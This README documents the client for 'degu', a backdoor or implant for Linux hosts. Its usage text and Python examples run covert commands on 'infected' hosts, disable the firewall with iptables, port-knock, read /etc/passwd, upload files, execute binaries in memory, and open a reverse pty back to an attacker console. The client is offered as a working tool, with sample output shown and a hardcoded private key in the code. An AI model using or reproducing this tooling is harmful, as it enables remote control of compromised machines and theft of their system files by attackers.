# degu-client
degu client part

Python API is still in early dev, library use std python3 lib, but dgu utility use docopt module ( `pip install docopt` )


### Main API

yet you can use main api :

```
#!/usr/bin/env python
import degu
import time

PRIVATE_KEY="f82876e92eaadc0702c16e7deca02ffe25116e84c8ba1e9ebb7423446dbae0534700b14ed3e531a3bc90f852b812df7d79e55190f60c9f2dc6fc0dc67aed0e92"

d = degu.degu("192.168.0.39",priv=PRIVATE_KEY)
d.ghost_exec(b"iptables -P INPUT ACCEPT")
d.ghost_exec(b"iptables -F")

d.knock(b":2222")
time.sleep(2)
aa=d.download(b"/etc/passwd")
print(aa)

d.knock(b":2222")
time.sleep(2)
aa=d.upload(b"/tmp/a",b"/tmp/pwned")

d.knock(b":2222")
time.sleep(2)
aa=d.mem_exec("../helper/cb",b"DEGU 192.168.0.39 11111 ")
```

### dgu utility

```
Usage:
    dgu bind  <rhost> <rport> read <rfile>
    dgu bind  <rhost> <rport> download <rfile> <lfile>
    dgu bind  <rhost> <rport> upload <lfile> <rfile>
    dgu bind  <rhost> <rport> exe <lfile> <parameters>
    dgu ghost <rhost> <cmd>
    dgu keygen

Examples:

    Upload local /tmp/dd file to remote /tmp/upped on degu infected
    host 192.168.0.49, asking him to open 12345 for bind connect :

$ dgu bind 192.168.0.49 12345 upload /tmp/dd /tmp/upped
[    INFO  14:11.57][degu ]: trying remote bind on 192.168.0.49:12345
[    INFO  14:11.59][degu ]: uploaded /tmp/dd on 192.168.0.49:12345:/tmp/upped

    Read remote /etc/passwd file, asking degu to wait on port 9991 for connection :

$ dgu bind 192.168.0.49 9991 read /etc/passwd
[    INFO  14:11.15][degu ]: trying remote bind on 192.168.0.49:9991
[    INFO  14:11.17][degu ]: downloading b'/etc/passwd'
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...

    Execute reverse pty on lhost 192.168.0.15:11111 using cb ( don't forget arg0 !)
on attacker console :

$ dgu bind 192.168.0.49 12311 exe helpers/cb "MYPROC 192.168.0.15 11111"
[    INFO  14:51.00][degu ]: trying remote bind on 192.168.0.49:12311
[    INFO  14:51.03][degu ]: send bin ok
[    INFO  14:51.03][degu ]: launch exe helpers/cb on 192.168.0.49

Execute over unfiltered dns

$ dgu ghost 192.168.0.49 "touch /tmp/pwneeee"
[    INFO  18:58.45][degu ]: ghost executing b'touch /tmp/pwneeee'
[   DEBUG  18:58.45][degu ]: executing : b'touch /tmp/pwneeee'
```
